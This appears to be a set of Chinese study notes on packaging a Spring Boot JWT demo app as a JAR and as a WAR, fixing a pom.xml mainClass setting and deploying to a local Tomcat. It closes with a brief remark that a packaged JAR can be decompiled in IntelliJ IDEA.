[https://blog.csdn.net/qingzhantianxia/article/details/129104228](https://blog.csdn.net/qingzhantianxia/article/details/129104228)







## 打包部署-JAR&WAR
### JAR
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901264.png)



出现的问题：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300859152.png)

解决：

[https://blog.csdn.net/Mrzhuangr/article/details/124731024](https://blog.csdn.net/Mrzhuangr/article/details/124731024)  
[https://blog.csdn.net/wobenqingfeng/article/details/129914639](https://blog.csdn.net/wobenqingfeng/article/details/129914639)

```xml
1、pom.xml 必须有mainClass，无true或者true改为false
<configuration>              			
    <mainClass>com.example.testjwtdemo.TestJwtDemoApplication</mainClass>

    <skip>false</skip>

</configuration>

```



正确执行后：可以正常访问

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901376.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300859900.png)











### WAR
参考：

[https://mp.weixin.qq.com/s/HyqVt7EMFcuKXfiejtfleg](https://mp.weixin.qq.com/s/HyqVt7EMFcuKXfiejtfleg)







<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901895.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300900130.png)

```plain
@Override
    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) {
        return builder.sources(TestJwtDemoApplication.class);
    }
```



将war文件放在：`D:\JavaCode\Tomcat\apache-tomcat-9.0.105\webapps`；

运行：`D:\JavaCode\Tomcat\apache-tomcat-9.0.105\bin\starup.bat`;



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902876.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901210.png)



访问：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300908647.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902438.png)



### 安全问题：
无源码下载风险

#### 源码反编译：
得到.jar压缩包后解压，用idea打开

会自动反编译（注释没了）

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300859222.png)

